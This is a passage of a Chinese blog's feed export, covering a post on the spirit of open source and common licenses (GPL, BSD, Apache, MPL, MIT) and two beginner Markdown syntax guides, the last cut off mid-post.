#x4F5C;&#x8005;&#x90FD;&#x662F;&#x5728;&#x5E55;&#x540E;&#x9ED8;&#x9ED8;&#x4E14;&#x65E0;&#x507F;&#x5730;&#x4ED8;&#x51FA;&#x52B3;&#x52A8;&#x6210;&#x679C;&#xFF0C;&#x4E3A;&#x7F8E;&#x597D;&#x7684;&#x4E16;&#x754C;&#x8D21;&#x732E;&#x4E00;&#x4EFD;&#x529B;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x4F7F;&#x7528;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x63A8;&#x52A8;&#x7684;&#x8F6F;&#x4EF6;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5927;&#x91CF;&#x7684;&#x4EBA;&#x529B;&#x3001;&#x7269;&#x529B;&#x548C;&#x8D22;&#x529B;&#x3002;</p><p><strong>&#x66F4;&#x900F;&#x660E;&#xFF1A;</strong>&#x6CA1;&#x6709;&#x54EA;&#x4E2A;&#x7B28;&#x86CB;&#x4F1A;&#x628A;&#x6728;&#x9A6C;&#x3001;&#x540E;&#x95E8;&#x7B49;&#x653E;&#x5230;&#x5F00;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x65E0;&#x7591;&#x662F;&#x628A;&#x81EA;&#x5DF1;&#x7684;&#x7F6A;&#x884C;&#x66B4;&#x9732;&#x5728;&#x9633;&#x5149;&#x4E4B;&#x4E0B;&#x3002;</p><p>&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x4E3A;&#x4E86;&#x5355;&#x7EAF;&#x8FFD;&#x6C42;&#x201C;&#x81EA;&#x7531;&#x201D;&#x800C;&#x727A;&#x7272;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5229;&#x76CA;&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x521B;&#x9020;&#x6FC0;&#x60C5;&#xFF0C;&#x56E0;&#x6B64;&#x4E16;&#x754C;&#x4E0A;&#x73B0;&#x5728;&#x6709;60&#x591A;&#x79CD;&#x88AB;&#x5F00;&#x6E90;&#x4FC3;&#x8FDB;&#x7EC4;&#x7EC7;&#xFF08;Open Source Initiative&#xFF09;&#x8BA4;&#x53EF;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6765;&#x4FDD;&#x8BC1;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x6743;&#x76CA;&#x3002;&#x5BF9;&#x4E8E;&#x90A3;&#x4E9B;&#x53EA;&#x77E5;&#x9053;&#x4E00;&#x5473;&#x6284;&#x88AD;&#x3001;&#x7BE1;&#x6539;&#x3001;&#x7834;&#x89E3;&#x6216;&#x8005;&#x76D7;&#x7248;&#x4ED6;&#x4EBA;&#x4F5C;&#x54C1;&#x7684;&#x4EBA;&#xFF0C;&#x7EC8;&#x5F52;&#x4F1A;&#x5728;&#x67D0;&#x4E00;&#x5929;&#x6536;&#x5230;&#x6CD5;&#x9662;&#x7684;&#x4F20;&#x7968;&#x3002;</p><a id="more"></a><hr><p><strong>GNU GPL (GNU General Public License , GNU&#x901A;&#x7528;&#x516C;&#x5171;&#x8BB8;&#x53EF;&#x8BC1;)&#xFF1A;</strong>&#x53EA;&#x8981;&#x54E6;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x4E86;&#x9075;&#x5FAA;GPL&#x534F;&#x8BAE;&#x7684;&#x4EA7;&#x54C1;&#x6216;&#x4EE3;&#x7801;&#xFF0C;&#x8BE5;&#x8F6F;&#x4EF6;&#x5C31;&#x5FC5;&#x987B;&#x9075;&#x5FAA;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E14;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x5E76;&#x4E0D;&#x9002;&#x5408;&#x5546;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x6570;&#x91CF;&#x53CA;&#x5176;&#x5E9E;&#x5927;&#xFF0C;&#x5305;&#x62EC;Linux&#x7CFB;&#x7EDF;&#x5728;&#x5185;&#x7684;&#x5927;&#x591A;&#x6570;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x7684;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://docs.blender.org/manual/zh-hans/dev/_images/getting-started_about_license_gnu-logo.png" alt="GNU" title="">                </div>                <div class="image-caption">GNU</div>            </figure><ul><li><strong>&#x590D;&#x5236;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5427;&#x8F6F;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x4EFB;&#x4F55;&#x4EBA;&#x7684;&#x7535;&#x8111;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x9650;&#x590D;&#x5236;&#x7684;&#x6570;&#x91CF;</li><li><strong>&#x4F20;&#x64AD;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x8F6F;&#x4EF6;&#x4EE5;&#x5404;&#x79CD;&#x5F62;&#x5F0F;&#x4F20;&#x64AD;</li><li><strong>&#x6536;&#x8D39;&#x4F20;&#x64AD;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5728;&#x5404;&#x79CD;&#x5A92;&#x4ECB;&#x4E0A;&#x51FA;&#x552E;&#x8BE5;&#x8F6F;&#x4EF6;&#xFF0C;&#x4F46;&#x5FC5;&#x987B;&#x63D0;&#x524D;&#x8BA9;&#x4E70;&#x5BB6;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x8F6F;&#x4EF6;&#x662F;&#x53EF;&#x4EE5;&#x514D;&#x8D39;&#x83B7;&#x5F97;&#x7684;&#xFF1B;&#x56E0;&#x6B64;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6709;&#x507F;&#x670D;&#x52A1;&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x76C8;&#x5229;&#x7684;&#x3002;</li><li><strong>&#x4FEE;&#x6539;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x589E;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8F6F;&#x4EF6;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x8F6F;&#x4EF6;&#x4FEE;&#x6539;&#x540E;&#x5FC5;&#x987B;&#x4F9D;&#x7136;&#x57FA;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6388;&#x6743;</li></ul><hr><p><strong>BSD(Berkeley Software Distribution&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;)&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong></p><p>&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x91CD;&#x65B0;&#x53D1;&#x5E03;&#x9075;&#x5FAA;&#x8BE5;&#x8BB8;&#x53EF;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5C06;&#x8F6F;&#x4EF6;&#x4F5C;&#x4E3A;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x548C;&#x9500;&#x552E;&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E0B;&#x9762;3&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://qph.fs.quoracdn.net/main-thumb-t-14907-200-seTLViB8UWkDHk3At9asR1xYPu5k6spg.jpeg" alt="BSD&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;" title="">                </div>                <div class="image-caption">BSD&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;</div>            </figure><p>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5219;&#x6E90;&#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x9075;&#x5FAA;BSD&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;<br>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x53EA;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x76F8;&#x5173;&#x6587;&#x6863;&#x6216;&#x7248;&#x6743;&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x9075;&#x5FAA;&#x4E86;BSD&#x534F;&#x8BAE;&#x3002;<br>&#x4E0D;&#x5141;&#x8BB8;&#x7528;&#x539F;&#x59CB;&#x8F6F;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x3001;&#x4F5C;&#x8005;&#x540D;&#x5B57;&#x6216;&#x673A;&#x6784;&#x540D;&#x79F0;&#x8FDB;&#x884C;&#x5E02;&#x573A;&#x63A8;&#x5E7F;&#x3002;</p><hr><p><strong>Apache &#x8BB8;&#x53EF;&#x8BC1;&#x7248;&#x672C;&#xFF08;Apache License Version&#xFF09;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong><br>&#x5728;&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x7248;&#x6743;&#x53CA;&#x4E13;&#x5229;&#x8BB8;&#x53EF;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x62E5;&#x6709;&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x53CA;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x81EA;&#x7531;&#x3002;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x9002;&#x7528;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#xFF0C;&#x73B0;&#x5728;&#x70ED;&#x95E8;&#x7684;Hadoop&#x3001;Apache HTTP Server&#x3001;MongoDB&#x7B49;&#x9879;&#x76EE;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x7814;&#x53D1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x5728;&#x5F00;&#x53D1;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x8F6F;&#x4EF6;&#x65F6;&#xFF0C;&#x8981;&#x4E25;&#x683C;&#x9075;&#x5B88;&#x4E0B;&#x9762;&#x7684;4&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Apache_Software_Foundation_Logo_%282016%29.svg/1200px-Apache_Software_Foundation_Logo_%282016%29.svg.png" alt="Apache License" title="">                </div>                <div class="image-caption">Apache License</div>            </figure><p>&#x8BE5;&#x8F6F;&#x4EF6;&#x53CA;&#x5176;&#x884D;&#x751F;&#x54C1;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;<br>&#x5982;&#x679C;&#x4FEE;&#x6539;&#x4E86;&#x7A0B;&#x5E8F;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6587;&#x6863;&#x4E2D;&#x8FDB;&#x884C;&#x58F0;&#x660E;&#x3002;<br>&#x82E5;&#x8F6F;&#x4EF6;&#x662F;&#x57FA;&#x4E8E;&#x4ED6;&#x4EBA;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x7F16;&#x5199;&#x800C;&#x6210;&#x7684;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x7684;&#x534F;&#x8BAE;&#x3001;&#x5546;&#x6807;&#x3001;&#x4E13;&#x5229;&#x58F0;&#x660E;&#x53CA;&#x5176;&#x4ED6;&#x539F;&#x4F5C;&#x8005;&#x58F0;&#x660E;&#x7684;&#x5185;&#x5BB9;&#x4FE1;&#x606F;&#x3002;<br>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x6709;&#x58F0;&#x660E;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x5728;&#x6B64;&#x6587;&#x4EF6;&#x4E2D;&#x6807;&#x6CE8;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x53CA;&#x5176;&#x4ED6;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;</p><hr><p><strong>MPL(Mozilla Public License&#xFF0C; Mozilla&#x516C;&#x5171;&#x8BB8;&#x53EF;)&#xFF1A;</strong></p><p>&#x76F8;&#x8F83;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF0C;MPL&#x66F4;&#x52A0;&#x6CE8;&#x91CD;&#x4E8E;&#x5BF9;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x9700;&#x6C42;&#x548C;&#x6536;&#x76CA;&#x4E4B;&#x95F4;&#x7684;&#x5E73;&#x8861;</p><hr><p><strong>MIT&#xFF08;Massachusetts Institute of Technology )&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong></p><p>&#x76EE;&#x524D;&#x9650;&#x5236;&#x6700;&#x5C11;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E4B;&#x4E00;&#xFF0C;&#x53EA;&#x8981;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x53D1;&#x8005;&#x5728;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x4FDD;&#x7559;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x8BB8;&#x53EF;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#xFF0C;&#x56E0;&#x6B64;&#x666E;&#x904D;&#x88AB;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x6240;&#x4F7F;&#x7528;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-开源共享精神&quot;&gt;&lt;a href=&quot;#1-开源共享精神&quot; class=&quot;headerlink&quot; title=&quot;1. 开源共享精神&quot;&gt;&lt;/a&gt;1. 开源共享精神&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;低风险：&lt;/strong&gt;使用闭源软件无疑把命运交付给他人，一旦封闭的源代码没有人来维护，你将进退维谷；而且相较于商业软件公司，开源社区很少存在倒闭的问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;高品质：&lt;/strong&gt;相较于闭源软件产品，开源项目通常是由开源社区来研发及维护的，参与编写、维护、测试的用户量众多，一般的bug还没有等爆发就已经被修补。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;低成本：&lt;/strong&gt;开源工作者都是在幕后默默且无偿地付出劳动成果，为美好的世界贡献一份力量，因此使用开源社区推动的软件项目可以节省大量的人力、物力和财力。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更透明：&lt;/strong&gt;没有哪个笨蛋会把木马、后门等放到开源代码中，这样无疑是把自己的罪行暴露在阳光之下。&lt;/p&gt;
&lt;p&gt;但是，如果开源软件为了单纯追求“自由”而牺牲程序员的利益，这将会影响程序员的创造激情，因此世界上现在有60多种被开源促进组织（Open Source Initiative）认可的开源许可协议来保证工作者的权益。对于那些只知道一味抄袭、篡改、破解或者盗版他人作品的人，终归会在某一天收到法院的传票。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="开源" scheme="https://marnm.github.io/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>Markdown 简明语法手册</title>
    <link href="https://marnm.github.io//posts/bff83912/"/>
    <id>https://marnm.github.io//posts/bff83912/</id>
    <published>2018-07-10T12:28:22.000Z</published>
    <updated>2020-04-09T11:50:11.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Markdown-&#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;"><a href="#Markdown-&#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;" class="headerlink" title="Markdown &#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;"></a>Markdown &#x7B80;&#x660E;&#x8BED;&#x6CD5;&#x624B;&#x518C;</h1><p><code>Markdown</code></p><hr><h3 id="1-&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;"><a href="#1-&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;" class="headerlink" title="1. &#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;"></a>1. &#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;</h3><p>&#x4F7F;&#x7528; * &#x548C; ** &#x8868;&#x793A;&#x7C97;&#x4F53;&#x548C;&#x659C;&#x4F53;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8FD9;&#x662F; <em>&#x659C;&#x4F53;</em> &#xFF0C;&#x8FD9;&#x662F; <strong>&#x7C97;&#x4F53;</strong> &#x3002;</p><h3 id="2-&#x5206;&#x7EA7;&#x6807;&#x9898;"><a href="#2-&#x5206;&#x7EA7;&#x6807;&#x9898;" class="headerlink" title="2. &#x5206;&#x7EA7;&#x6807;&#x9898;"></a>2. &#x5206;&#x7EA7;&#x6807;&#x9898;</h3><p>&#x4F7F;&#x7528; === &#x8868;&#x793A;&#x4E00;&#x7EA7;&#x6807;&#x9898;&#xFF0C; &#x4F7F;&#x7528; &#x2014; &#x8868;&#x793A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;&#x3002;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E00;&#x7EA7;&#x6807;&#x9898;</span><br><span class="line">========================</span><br><span class="line">&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E8C;&#x7EA7;&#x6807;&#x9898;</span><br><span class="line">-------------------------</span><br><span class="line">### &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E09;&#x7EA7;&#x6807;&#x9898;</span><br></pre></td></tr></tbody></table></figure><p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5728;&#x884C;&#x9996;&#x52A0;#&#x53F7;&#x8868;&#x793A;&#x4E0D;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x6807;&#x9898;&#xFF08;H1-H6&#xFF09;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;# H1,&#xFF0C;## H2&#xFF0C; ### H3&#xFF0C;#### H4&#x3002;</p><h3 id="3-&#x8D85;&#x94FE;&#x63A5;"><a href="#3-&#x8D85;&#x94FE;&#x63A5;" class="headerlink" title="3. &#x8D85;&#x94FE;&#x63A5;"></a>3. &#x8D85;&#x94FE;&#x63A5;</h3><p>&#x4F7F;&#x7528;[&#x63CF;&#x8FF0;](&#x94FE;&#x63A5;&#x5730;&#x5740;)&#x4E3A;&#x6587;&#x5B57;&#x589E;&#x52A0;&#x8D85;&#x94FE;&#x63A5;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x53BB;&#x73A9;<a href="http://www.dsig.xyz/" target="_blank" rel="noopener">&#x672C;&#x4EBA;&#x535A;&#x5BA2;</a>&#x7684;&#x8FDE;&#x63A5;</p><h3 id="4-&#x65E0;&#x5E8F;&#x5217;&#x8868;"><a href="#4-&#x65E0;&#x5E8F;&#x5217;&#x8868;" class="headerlink" title="4. &#x65E0;&#x5E8F;&#x5217;&#x8868;"></a>4. &#x65E0;&#x5E8F;&#x5217;&#x8868;</h3><p>&#x4F7F;&#x7528; *&#xFF0C;+&#xFF0C;- &#x8868;&#x793A;&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x3002;</p><p>&#x793A;&#x4F8B;</p><ul><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00;</li><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C;</li><li>&#x65E0;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09;</li></ul><h3 id="5-&#x6709;&#x5E8F;&#x5217;&#x8868;"><a href="#5-&#x6709;&#x5E8F;&#x5217;&#x8868;" class="headerlink" title="5. &#x6709;&#x5E8F;&#x5217;&#x8868;"></a>5. &#x6709;&#x5E8F;&#x5217;&#x8868;</h3><p>&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x548C;&#x70B9;&#x8868;&#x793A;&#x6709;&#x5E8F;&#x5217;&#x8868;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><ol><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E00;</li><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E8C;</li><li>&#x6709;&#x5E8F;&#x5217;&#x8868;&#x9879;&#x4E09;</li></ol><h3 id="6-&#x6587;&#x5B57;&#x5F15;&#x7528;"><a href="#6-&#x6587;&#x5B57;&#x5F15;&#x7528;" class="headerlink" title="6. &#x6587;&#x5B57;&#x5F15;&#x7528;"></a>6. &#x6587;&#x5B57;&#x5F15;&#x7528;</h3><p>&#x4F7F;&#x7528; &gt; &#x8868;&#x793A;&#x6587;&#x5B57;&#x5F15;&#x7528;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><blockquote><p>&#x541B;&#x4E0D;&#x89C1;&#xFF0C;&#x9EC4;&#x6CB3;&#x4E4B;&#x6C34;&#x5929;&#x4E0A;&#x6765;&#xFF0C;&#x5954;&#x6D41;&#x5230;&#x6D77;&#x4E0D;&#x590D;&#x56DE;&#x3002;</p><p>&#x5929;&#x751F;&#x6211;&#x6750;&#x5FC5;&#x6709;&#x7528;&#xFF0C;&#x5343;&#x91D1;&#x6563;&#x5C3D;&#x8FD8;&#x590D;&#x6765;&#x3002;</p></blockquote><h3 id="7-&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;"><a href="#7-&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;" class="headerlink" title="7. &#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;"></a>7. &#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;</h3><p>&#x4F7F;&#x7528; `&#x4EE3;&#x7801;` &#x8868;&#x793A;&#x884C;&#x5185;&#x4EE3;&#x7801;&#x5757;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8BA9;&#x6211;&#x4EEC;&#x804A;&#x804A;<code>Python</code></p><h3 id="8-&#x4EE3;&#x7801;&#x5757;"><a href="#8-&#x4EE3;&#x7801;&#x5757;" class="headerlink" title="8. &#x4EE3;&#x7801;&#x5757;"></a>8. &#x4EE3;&#x7801;&#x5757;</h3><p>&#x4F7F;&#x7528; &#x56DB;&#x4E2A;&#x7F29;&#x8FDB;&#x7A7A;&#x683C; &#xFF08;&#x6216;&#x8005;&#x4E00;&#x4E2A;<code>Tab&#x952E;</code>&#xFF09;&#x8868;&#x793A;&#x4EE3;&#x7801;&#x5757;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mian</span><span class="params">(String[] args)</span></span>{</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="9-&#x63D2;&#x5165;&#x56FE;&#x50CF;"><a href="#9-&#x63D2;&#x5165;&#x56FE;&#x50CF;" class="headerlink" title="9. &#x63D2;&#x5165;&#x56FE;&#x50CF;"></a>9. &#x63D2;&#x5165;&#x56FE;&#x50CF;</h3><p>&#x4F7F;&#x7528; ![&#x63CF;&#x8FF0;](&#x56FE;&#x7247;&#x94FE;&#x63A5;&#x5730;&#x5740;) &#x63D2;&#x5165;&#x56FE;&#x50CF;</p><p>&#x793A;&#x4F8B;&#xFF1A;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://www.zybuluo.com/static/img/my_head.jpg" alt="&#x6211;&#x7684;&#x5934;&#x50CF;" title="">                </div>                <div class="image-caption">&#x6211;&#x7684;&#x5934;&#x50CF;</div>            </figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Markdown-&amp;#x7B80;&amp;#x660E;&amp;#x8BED;&amp;#x6CD5;&amp;#x624B;&amp;#x518C;&quot;&gt;&lt;a href=&quot;#Markdown-&amp;#x7B80;&amp;#x660E;&amp;#x8BED;&amp;#x6CD5;&amp;#x624B;&amp;#x518C;&quot; clas
      
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="标记语言" scheme="https://marnm.github.io/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法说明（快速入门）</title>
    <link href="https://marnm.github.io//posts/5125c787/"/>
    <id>https://marnm.github.io//posts/5125c787/</id>
    <published>2018-07-05T09:15:52.000Z</published>
    <updated>2022-05-26T13:31:14.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Markdown&#x8BED;&#x6CD5;"><a href="#Markdown&#x8BED;&#x6CD5;" class="headerlink" title="Markdown&#x8BED;&#x6CD5;"></a>Markdown&#x8BED;&#x6CD5;</h2><p>&#x7B80;&#x5355;&#x8BF4;&#x4E0B;&#x4E00;&#x4E9B;Markdown&#x7684;&#x8BED;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x66F4;&#x52A0;&#x719F;&#x6089;&#x7684;&#x4F7F;&#x7528;Markdown&#x7F16;&#x5199;&#x6587;&#x7AE0;&#x4E86;&#x3002;</p><h5 id="&#x6807;&#x9898;"><a href="#&#x6807;&#x9898;" class="headerlink" title="&#x6807;&#x9898;"></a>&#x6807;&#x9898;</h5><pre><code># h1&#x7EA7;&#x6807;&#x9898;## h2&#x7EA7;&#x6807;&#x9898;### h3&#x7EA7;&#x6807;&#x9898;#### h4&#x7EA7;&#x6807;&#x9898;##### h5&#x7EA7;&#x6807;&#x9898;</code></pre><hr><h5 id="&#x5217;&#x8868;"><a href="#&#x5217;&#x8868;" class="headerlink" title="&#x5217;&#x8868;"></a>&#x5217;&#x8868;</h5><pre><code>#&#x6709;&#x5E8F;&#x5217;&#x8868;1.&#x5217;&#x8868;12.&#x5217;&#x8868;23.&#x5217;&#x8868;3</code></pre><hr><pre><code>#&#x65E0;&#x5E8F;&#x5217;&#x8868;:&#x4F7F;&#x7528; - 